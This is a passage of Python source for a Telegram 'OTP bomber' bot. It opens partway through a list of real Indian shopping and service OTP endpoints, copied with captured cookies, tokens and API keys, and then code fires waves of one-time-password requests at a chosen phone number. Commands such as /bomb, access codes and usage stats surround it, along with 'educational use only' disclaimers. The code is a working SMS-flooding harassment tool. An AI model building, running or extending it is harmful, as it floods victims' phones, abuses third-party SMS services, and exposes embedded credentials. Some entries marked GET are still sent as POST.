            "sec-ch-ua-mobile": "?1",
            "origin": "https://www.cossouq.com",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.cossouq.com/?srsltid=AfmBOoqQ0GRbpH-mXrUJ5b6tAC5W6ZyAzFJRI7l0mbnNQ9i5LMpAIvh1",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "priority": "u=1, i",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Cookie": "X-Magento-Vary=7253ab9fc388bf858e88f6c5b3ad9d20efd0c2afa76c88022c82f5b7e12d8dd8; PHPSESSID=0bf7f5d8d3af44bc50aeda7b8b51fa8b; _gcl_au=1.1.1097443806.1745238499; _ga_3YTXH403VL=GS1.1.1745238499.1.0.1745238499.60.0.1102057604; _ga=GA1.1.192685670.1745238500; _fbp=fb.1.1745238506999.831971844971570496; fastrr_uuid=1b20f947-fed8-49e5-a719-e9ffad876e6d; fastrr_usid=1b20f947-fed8-49e5-a719-e9ffad876e6d-1745238507912; sociallogin_referer_store=https://www.cossouq.com/?srsltid=AfmBOoqQ0GRbpH-mXrUJ5b6tAC5W6ZyAzFJRI7l0mbnNQ9i5LMpAIvh1; form_key=YJhK7hwSLfPsrlIo; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-messages=; cf_clearance=j19CDG8K1gn1L1h7_4VZCKUooUZtTYpxeBUC2Lux3Zo-1745238510-1.2.1.1-Cqvbh_RiIRgsCZKrpq.nnB.sx3LbLUw3MdbYfWzupniUjlhOYxqxVZSfwZfdm39IFuJrct6OeXj60cIyZotm9G1qptUBqCEHw_A5XjlhmtZ5_52EG9n0r0q9rhTZ.qT6ao7jj8k4RANRvHshdV47fXpz7BmvvvHl856x.tnP32auJyOBAP0KAw9SyZSXAC3XhR2CWs._08I21k90gtw3Qv8tjjlbqQjQNV9_ctDV6j2J_kh4xzhzQQQ2LrbuxtHjF_AjllteBD7a4BwuGq9roN0N48thQC3_meeP8irRIXLN7ndRE4vnvQJgrVN9iE9DxDhphhKGRt4xiZthB9XpZvWgH1u62Q5otw9kyTp75bs; section_data_ids={%22merge-quote%22:1745238511%2C%22cart%22:1745238512%2C%22custom_section%22:1745238513}; private_content_version=1c35968280f95365b50e1c62ebfbdb01"
        },
        "data": lambda phone: f"mobilenumber={phone}&otptype=register&resendotp=0&email=&oldmobile=0"
    },
    {
        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/json",
            "sec-ch-ua-platform": "Android",
            "authorization": "Bearer null",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "sec-ch-ua-mobile": "?1",
            "origin": "https://app.shiprocket.in",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://app.shiprocket.in/",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "priority": "u=1, i",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'
    },
    {
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/json",
            "gk-version": "20250421065835697",
            "gk-timestamp": "58174641",
            "sec-ch-ua-platform": "Android",
            "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc0NTIzOTI0MywiZXhwIjoxNzQ1MjM5MzAzfQ.-gV0sRUkGD4SPGPUUJ6XBanoDCI7VSNX99oGsUU5nWk",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "gk-signature": "076108",
            "gk-udf-1": "951",
            "sec-ch-ua-mobile": "?1",
            "gk-request-id": "a0cecd38-e690-48d5-ab80-b9d2feed3761",
            "gk-merchant-id": "19g6jlc658iad",
            "origin": "https://pdp.gokwik.co",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://pdp.gokwik.co/",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "priority": "u=1, i",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"phone":"{phone}","country":"in"}}'
    },
    {
        "url": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=false",
        "method": "GET",
        "headers": {
            "Host": "www.jockey.in",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
            "Accept": "*/*",
            "Referer": "https://www.jockey.in/",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US,en;q=0.9,bn;q=0.8,hi;q=0.7,zh-CN;q=0.6,zh;q=0.5"
        },
        "data": None
    },
    {
        "url": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true",
        "method": "GET",
        "headers": {
            "Host": "www.jockey.in",
            "Accept": "*/*",
            "X-Requested-With": "pure.lite.browser",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://www.jockey.in/",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Sec-CH-UA-Platform": "\"Android\"",
            "Sec-CH-UA": "\"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
            "Sec-CH-UA-Mobile": "?1",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
            "Cookie": "secure_customer_sig=; localization=IN; _tracking_consent=%7B%22con%22%3A%7B%22CMP%22%3A%7B%22a%22%3A%22%22%2C%22m%22%3A%22%22%2C%22p%22%3A%22%22%2C%22s%22%3A%22%22%7D%7D%2C%22v%22%3A%222.1%22%2C%22region%22%3A%22INMP%22%2C%22reg%22%3A%22%22%2C%22purposes%22%3A%7B%22p%22%3Atrue%2C%22a%22%3Atrue%2C%22m%22%3Atrue%2C%22t%22%3Atrue%7D%2C%22display_banner%22%3Afalse%2C%22sale_of_data_region%22%3Afalse%2C%22consent_id%22%3A%220076A26B-593e-4179-adb7-7df1a1acfdaa%22%7D; _shopify_y=43a0be93-7c1c-4f33-bfad-c1477bb4a5c4; wishlist_id=7531056362767gn1bc6na3; bookmarkeditems={\"items\":[]}; wishlist_customer_id=0; _orig_referrer=; _landing_page=%2F%3Fsrsltid%3DAfmBOopQUXJnULldDNJDov4FZosiMLiJWWydft0OHn_M2nopq0YOyBr7; _shopify_sa_p=; cart=Z2NwLWFzaWEtc291dGhlYXN0MTowMUpHWUhOUkZWS0RNWFlQRTY0S1dFWTA1Sw%3Fkey%3D38a52d30f4363b9ee4e8ffea783532bb; keep_alive=c4db46b0-bfba-48e7-878e-f6e81085a234; cart_ts=1736192207; cart_sig=04c8cecd093ed714d4a4dd68dfcc4020; cart_currency=INR; _shopify_s=83810dbb-190b-45ae-bb0a-de2fbf1090ed; _shopify_sa_t=2025-01-06T19%3A36%3A47.278Z"
        },
        "data": None
    },
    {
        "url": "https://prodapi.newme.asia/web/otp/request",
        "method": "POST",
        "headers": {
            "Host": "prodapi.newme.asia",
            "Content-Length": lambda data: str(len(data)),
            "Timestamp": lambda: str(int(time.time() * 1000)),
            "Delivery-Pincode": "",
            "Caller": "web_app",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "Accept": "*/*",
            "Origin": "https://newme.asia",
            "Referer": "https://newme.asia/",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US,en;q=0.9,bn;q=0.8,hi;q=0.7,zh-CN;q=0.6,zh;q=0.5"
        },
        "data": lambda phone: f'{{"mobile_number":"{phone}","resend_otp_request":true}}'
    },
    {
        "url": lambda phone: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}",
        "method": "GET",
        "headers": {
            "Host": "api.univest.in",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/3.9.1"
        },
        "data": None
    },
    {
        "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json; charset=utf-8",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/3.9.1"
        },
        "data": lambda phone: f'{{"country_code":"+91","phone":"{phone}"}}'
    },
    {
        "url": "https://www.foxy.in/api/v2/users/send_otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Platform": "web",
            "Origin": "https://www.foxy.in",
            "X-Requested-With": "pure.lite.browser",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://www.foxy.in/onboarding",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Sec-CH-UA-Platform": "\"Android\"",
            "Sec-CH-UA": "\"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
            "Sec-CH-UA-Mobile": "?1",
            "X-Guest-Token": "01943c60-aea9-7ddc-b105-e05fbcf832be",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"guest_token":"01943c60-aea9-7ddc-b105-e05fbcf832be","user":{{"phone_number":"+91{phone}"}},"device":null,"invite_code":""}}'
    },
    {
        "url": "https://auth.eka.care/auth/init",
        "method": "POST",
        "headers": {
            "Device-Id": "5df83c463f0ff8ff",
            "Flavour": "android",
            "Locale": "en",
            "Version": "1382",
            "Client-Id": "androidp",
            "Content-Type": "application/json; charset=UTF-8",
            "Accept-Encoding": "gzip, deflate",
            "User-Agent": "okhttp/4.9.3"
        },
        "data": lambda phone: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{phone}"}},"type":"mobile"}}'
    },
    {
        "url": "https://www.foxy.in/api/v2/users/send_otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Platform": "web",
            "Origin": "https://www.foxy.in",
            "X-Requested-With": "pure.lite.browser",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://www.foxy.in/onboarding",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Sec-CH-UA-Platform": "\"Android\"",
            "Sec-CH-UA": "\"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
            "Sec-CH-UA-Mobile": "?1",
            "X-Guest-Token": "01943c60-aea9-7ddc-b105-e05fbcf832be",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"user":{{"phone_number":"+91{phone}"}},"via":"whatsapp"}}'
    },
    {
        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        "method": "POST",
        "headers": {
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "Origin": "https://smytten.com",
            "X-Requested-With": "pure.lite.browser",
            "Sec-Fetch-Site": "same-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://smytten.com/",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Sec-CH-UA-Platform": "\"Android\"",
            "Sec-CH-UA": "\"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
            "Sec-CH-UA-Mobile": "?1",
            "Desktop-Request": "false",
            "Web-Version": "1",
            "UUID": "8e6b1c3f-3d72-42af-89af-201b79dfdf2f",
            "Request-Type": "web",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"ad_id":"","device_info":{{}},"device_id":"","app_version":"","device_token":"","device_platform":"web","phone":"{phone}","email":"sdhabai09@gmail.com"}}'
    },
    {
        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "Origin": "https://www.wakefit.co",
            "X-Requested-With": "pure.lite.browser",
            "Sec-Fetch-Site": "same-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://www.wakefit.co/",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Sec-CH-UA-Platform": "\"Android\"",
            "Sec-CH-UA": "\"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
            "Sec-CH-UA-Mobile": "?1",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
            "API-Secret-Key": "ycq55IbIjkLb",
            "API-Token": "c84d563b77441d784dce71323f69eb42",
            "My-Cookie": "undefined"
        },
        "data": lambda phone: f'{{"mobile":"{phone}","whatsapp_opt_in":1}}'
    },
    {
        "url": "https://www.caratlane.com/cg/dhevudu",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            "Origin": "https://www.caratlane.com",
            "Referer": "https://www.caratlane.com/register",
            "Accept-Encoding": "gzip, deflate, br",
            "Authorization": "b945ebaf43ed7541d49cfd60bd82b81908edff8d465caecfe58deef209",
            "X-Authorization": "b945ebaf43ed7541d49cfd60bd82b81908edff8d465caecfe58deef209"
        },
        "data": lambda phone: f'{{"query":"\\n        mutation {{\\n            SendOtp( \\n                input: {{\\n        mobile: \\"{phone}\\",\\n        isdCode: \\"91\\",\\n        otpType: \\"registerOtp\\"\\n      }}\\n            ) {{\\n                status {{\\n                    message\\n                    code\\n                }}\\n            }}\\n        }}\\n    "}}'
    }
]

# Store active bombing sessions
active_sessions = {}

# ===== HELPER FUNCTIONS =====
def is_authorized(user_id):
    """Check if user is authorized"""
    return str(user_id) in authorized_users

def authorize_user(user_id):
    """Authorize a user"""
    user_id_str = str(user_id)
    authorized_users.add(user_id_str)
    if user_id_str not in user_stats:
        user_stats[user_id_str] = {
            "bombs": 0,
            "otps_sent": 0,
            "authorized_at": datetime.now()
        }

def update_bomb_stats(user_id, otp_count):
    """Update bombing statistics"""
    user_id_str = str(user_id)
    if user_id_str in user_stats:
        user_stats[user_id_str]["bombs"] += 1
        user_stats[user_id_str]["otps_sent"] += otp_count
    global_stats["total_bombs"] += 1
    global_stats["total_otps_sent"] += otp_count

async def make_api_call(session, config, phone):
    """Make a single API call"""
    try:
        url = config["url"]
        headers = config["headers"].copy()
        data = config["data"](phone) if config["data"] else None
        
        async with session.post(url, headers=headers, data=data, timeout=5) as response:
            return {
                "name": config["name"],
                "status": response.status,
                "success": 200 <= response.status < 300
            }
    except Exception as e:
        return {
            "name": config["name"],
            "status": "Error",
            "success": False,
            "error": str(e)
        }

async def send_otp_wave(phone, callback=None):
    """Send one wave of OTP requests"""
    async with aiohttp.ClientSession() as session:
        tasks = [make_api_call(session, config, phone) for config in API_CONFIGS]
        results = await asyncio.gather(*tasks)
        
        success_count = sum(1 for r in results if r["success"])
        
        if callback:
            await callback(results, success_count)
        
        return results

# ===== AUTHORIZATION HANDLERS =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command"""
    user_id = update.effective_user.id
    
    if is_authorized(user_id):
        welcome_msg = (
            "🤖 *OTP Tester Bot - Educational Purpose*\n\n"
            "✅ You are authorized!\n\n"
            "⚠️ *WARNING:* This bot is for educational testing only!\n"
            "✅ Only use on YOUR OWN phone number\n"
            "❌ Misuse is illegal and unethical\n\n"
            "*Commands:*\n"
            "/start - Show this message\n"
            "/test <number> - Test OTP on a number\n"
            "/bomb <number> <count> - Send multiple OTPs\n"
            "/stop - Stop active session\n"
            "/status - Check active sessions\n"
            "/stats - View your statistics\n"
            "/help - Show help\n\n"
            "Send a 10-digit phone number to begin."
        )
        await update.message.reply_text(welcome_msg, parse_mode="Markdown")
    else:
        if not ACCESS_CODE:
            # If no access code set, authorize everyone
            authorize_user(user_id)
            await start(update, context)
            return
        
        welcome_msg = (
            "🔐 *Access Code Required*\n\n"
            "This bot requires an access code to use.\n"
            "Please enter the access code to continue:\n\n"
            "❌ Cancel - /cancel"
        )
        await update.message.reply_text(welcome_msg, parse_mode="Markdown")
        return WAITING_FOR_CODE

async def check_access_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check if entered access code is correct"""
    user_id = update.effective_user.id
    code = update.message.text.strip()
    
    if code == ACCESS_CODE:
        authorize_user(user_id)
        await update.message.reply_text(
            "✅ *Access Granted!*\n\n"
            "You are now authorized to use the bot.\n"
            "Send /start to see available commands.",
            parse_mode="Markdown"
        )
        return ConversationHandler.END
    else:
        await update.message.reply_text(
            "❌ *Incorrect Access Code!*\n\n"
            "Please try again or contact the admin.\n"
            "Cancel - /cancel",
            parse_mode="Markdown"
        )
        return WAITING_FOR_CODE

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel access code entry"""
    await update.message.reply_text(
        "❌ Cancelled. You need an access code to use this bot.\n"
        "Send /start to try again."
    )
    return ConversationHandler.END

# ===== STATS COMMAND =====
async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show statistics"""
    user_id = update.effective_user.id
    
    if not is_authorized(user_id):
        await update.message.reply_text("❌ You need to authorize first! Send /start")
        return
    
    user_id_str = str(user_id)
    is_admin = user_id_str in ADMIN_USER_IDS
    
    # User stats
    user_data = user_stats.get(user_id_str, {})
    user_bombs = user_data.get("bombs", 0)
    user_otps = user_data.get("otps_sent", 0)
    auth_date = user_data.get("authorized_at", datetime.now())
    
    stats_msg = f"📊 *Your Statistics*\n\n"
    stats_msg += f"💣 Total Bombs: {user_bombs}\n"
    stats_msg += f"📱 Total OTPs Sent: {user_otps}\n"
    stats_msg += f"📅 Authorized Since: {auth_date.strftime('%Y-%m-%d %H:%M')}\n"
    
    # Admin gets global stats
    if is_admin:
        uptime = datetime.now() - global_stats["bot_started_at"]
        hours = int(uptime.total_seconds() // 3600)
        minutes = int((uptime.total_seconds() % 3600) // 60)
        
        stats_msg += f"\n🔧 *Admin Statistics*\n\n"
        stats_msg += f"👥 Authorized Users: {len(authorized_users)}\n"
        stats_msg += f"💣 Total Bombs (All Users): {global_stats['total_bombs']}\n"
        stats_msg += f"📱 Total OTPs (All Users): {global_stats['total_otps_sent']}\n"
        stats_msg += f"⏱️ Bot Uptime: {hours}h {minutes}m\n"
        
        # Top users
        if user_stats:
            sorted_users = sorted(user_stats.items(), key=lambda x: x[1]["bombs"], reverse=True)[:5]
            stats_msg += f"\n🏆 *Top 5 Users:*\n"
            for idx, (uid, data) in enumerate(sorted_users, 1):
                stats_msg += f"{idx}. User {uid[:8]}... - {data['bombs']} bombs\n"
    
    await update.message.reply_text(stats_msg, parse_mode="Markdown")

# ===== BOT COMMAND HANDLERS =====
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Help command"""
    user_id = update.effective_user.id
    
    if not is_authorized(user_id):
        await update.message.reply_text("❌ You need to authorize first! Send /start")
        return
    
    help_msg = (
        "*How to use:*\n\n"
        "1️⃣ Send a 10-digit phone number (without +91)\n"
        "2️⃣ Choose single test or multiple waves\n"
        "3️⃣ Monitor the results\n\n"
        "*Examples:*\n"
        "`/test 9876543210` - Single OTP test\n"
        "`/bomb 9876543210 5` - Send 5 waves\n\n"
        "*Note:* Use responsibly and only on your own number!"
    )
    await update.message.reply_text(help_msg, parse_mode="Markdown")

async def test_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Test single OTP wave"""
    user_id = update.effective_user.id
    
    if not is_authorized(user_id):
        await update.message.reply_text("❌ You need to authorize first! Send /start")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /test <phone_number>")
        return
    
    phone = context.args[0].strip()
    
    if not phone.isdigit() or len(phone) != 10:
        await update.message.reply_text("❌ Invalid phone number! Must be 10 digits.")
        return
    
    msg = await update.message.reply_text(f"🔄 Testing OTP services for {phone}...")
    
    async def callback(results, success_count):
        result_text = f"📊 *Test Results for {phone}*\n\n"
        result_text += f"✅ Success: {success_count}/{len(results)}\n\n"
        
        for r in results:
            emoji = "✅" if r["success"] else "❌"
            result_text += f"{emoji} {r['name']}: {r['status']}\n"
        
        await msg.edit_text(result_text, parse_mode="Markdown")
    
    results = await send_otp_wave(phone, callback)
    success_count = sum(1 for r in results if r["success"])
    update_bomb_stats(user_id, success_count)

async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send multiple OTP waves"""
    user_id = update.effective_user.id
    
    if not is_authorized(user_id):
        await update.message.reply_text("❌ You need to authorize first! Send /start")
        return
    
    if len(context.args) != 2:
        await update.message.reply_text("Usage: /bomb <phone_number> <count>")
        return
    
    phone = context.args[0].strip()
    
    try:
        count = int(context.args[1])
        if count < 1 or count > 10:
            await update.message.reply_text("❌ Count must be between 1 and 10")
            return
    except ValueError:
        await update.message.reply_text("❌ Invalid count! Must be a number.")
        return
    
    if not phone.isdigit() or len(phone) != 10:
        await update.message.reply_text("❌ Invalid phone number! Must be 10 digits.")
        return
    
    # Store session
    active_sessions[user_id] = {"phone": phone, "active": True}
    
    msg = await update.message.reply_text(
        f"🚀 Starting {count} waves for {phone}...\n"
        f"Use /stop to cancel anytime."
    )
    
    total_success = 0
    
    for i in range(count):
        if not active_sessions.get(user_id, {}).get("active", False):
            await msg.edit_text(f"⏹️ Stopped at wave {i}/{count}")
            break
        
        async def callback(results, success_count):
            nonlocal total_success
            total_success += success_count
            await msg.edit_text(
                f"📡 Wave {i+1}/{count} completed\n"
                f"✅ Total Success: {total_success}\n"
                f"⏳ Progress: {'▓' * (i+1)}{'░' * (count-i-1)}"
            )
        
        await send_otp_wave(phone, callback)
        
        if i < count - 1:
            await asyncio.sleep(2)
    
    if user_id in active_sessions:
        del active_sessions[user_id]
    
    update_bomb_stats(user_id, total_success)
    
    await msg.edit_text(
        f"✅ Completed {count} waves for {phone}\n"
        f"📊 Total Success: {total_success}/{count * len(API_CONFIGS)}"
    )

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop active bombing session"""
    user_id = update.effective_user.id
    
    if not is_authorized(user_id):
        await update.message.reply_text("❌ You need to authorize first! Send /start")
        return
    
    if user_id in active_sessions:
        active_sessions[user_id]["active"] = False
        await update.message.reply_text("⏹️ Stopping your active session...")
    else:
        await update.message.reply_text("❌ No active session found.")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check status"""
    user_id = update.effective_user.id
    
    if not is_authorized(user_id):
        await update.message.reply_text("❌ You need to authorize first! Send /start")
        return
    
    if user_id in active_sessions and active_sessions[user_id]["active"]:
        phone = active_sessions[user_id]["phone"]
        await update.message.reply_text(f"🔄 Active session for: {phone}")
    else:
        await update.message.reply_text("✅ No active sessions")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle plain text messages (phone numbers)"""
    user_id = update.effective_user.id
    
    if not is_authorized(user_id):
        await update.message.reply_text("❌ You need to authorize first! Send /start")
        return
    
    text = update.message.text.strip()
    
    if text.isdigit() and len(text) == 10:
        keyboard = [
            [InlineKeyboardButton("🧪 Single Test", callback_data=f"test_{text}")],
            [InlineKeyboardButton("💣 3 Waves", callback_data=f"bomb_{text}_3")],
            [InlineKeyboardButton("🔥 5 Waves", callback_data=f"bomb_{text}_5")],
            [InlineKeyboardButton("❌ Cancel", callback_data="cancel")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"📱 Phone Number: *{text}*\n\n"
            f"⚠️ Use only on YOUR number!\n"
            f"Choose an option:",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text(
            "❌ Invalid input!\n"
            "Send a 10-digit phone number or use /help"
        )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button presses"""
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    
    if not is_authorized(user_id):
        await query.edit_message_text("❌ You need to authorize first! Send /start")
        return
    
    data = query.data
    
    if data == "cancel":
        await query.edit_message_text("❌ Cancelled")
        return
    
    parts = data.split("_")
    action = parts[0]
    phone = parts[1]
    
    if action == "test":
        await query.edit_message_text(f"🔄 Testing {phone}...")
        
        async def callback(results, success_count):
            result_text = f"📊 *Test Results*\n\n"
            result_text += f"✅ Success: {success_count}/{len(results)}\n\n"
            
            for r in results:
                emoji = "✅" if r["success"] else "❌"
                result_text += f"{emoji} {r['name']}: {r['status']}\n"
            
            await query.edit_message_text(result_text, parse_mode="Markdown")
        
        results = await send_otp_wave(phone, callback)
        success_count = sum(1 for r in results if r["success"])
        update_bomb_stats(user_id, success_count)
    
    elif action == "bomb":
        count = int(parts[2])
        active_sessions[user_id] = {"phone": phone, "active": True}
        
        await query.edit_message_text(f"🚀 Starting {count} waves...")
        
        total_success = 0
        
        for i in range(count):
            if not active_sessions.get(user_id, {}).get("active", False):
                await query.edit_message_text(f"⏹️ Stopped at wave {i}/{count}")
                break
            
            async def cb(results, success_count):
                nonlocal total_success
                total_success += success_count
                await query.edit_message_text(
                    f"📡 Wave {i+1}/{count}\n"
                    f"✅ Success: {total_success}\n"
                    f"{'▓' * (i+1)}{'░' * (count-i-1)}"
                )
            
            await send_otp_wave(phone, cb)
            
            if i < count - 1:
                await asyncio.sleep(2)
        
        if user_id in active_sessions:
            del active_sessions[user_id]
        
        update_bomb_stats(user_id, total_success)
        
        await query.edit_message_text(f"✅ Completed {count} waves!\n📊 Success: {total_success}")

# ===== ERROR HANDLER =====
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Log errors"""
    print(f"Update {update} caused error {context.error}")

# ===== MAIN =====
def main():
    """Start the bot"""
    if not BOT_TOKEN:
        print("❌ BOT_TOKEN not found in environment variables!")
        print("Please set BOT_TOKEN in your .env file or Railway environment variables")
        return
    
    print("🤖 Starting OTP Tester Bot...")
    print(f"🌐 Port: {PORT}")
    print(f"🔗 Webhook: {WEBHOOK_URL if WEBHOOK_URL else 'Polling mode'}")
    print(f"🔐 Access Code: {'Enabled' if ACCESS_CODE else 'Disabled (Open Access)'}")
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Conversation handler for access code
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            WAITING_FOR_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, check_access_code)]
        },
        fallbacks=[CommandHandler("cancel", cancel)]
    )
    
    # Add handlers
    app.add_handler(conv_handler)
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("test", test_command))
    app.add_handler(CommandHandler("bomb", bomb_command))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_error_handler(error_handler)
    
    # Use webhook for Railway, polling for local
    if WEBHOOK_URL:
        try:
            print("✅ Running in webhook mode (Railway)")
            app.run_webhook(
                listen="0.0.0.0",
                port=PORT,
                webhook_url=f"{WEBHOOK_URL}/{BOT_TOKEN}",
                url_path=BOT_TOKEN,
                allowed_updates=Update.ALL_TYPES
            )
        except Exception as e:
            print(f"❌ Webhook error: {e}")
            print("🔄 Falling back to polling mode...")
            app.run_polling(allowed_updates=Update.ALL_TYPES)
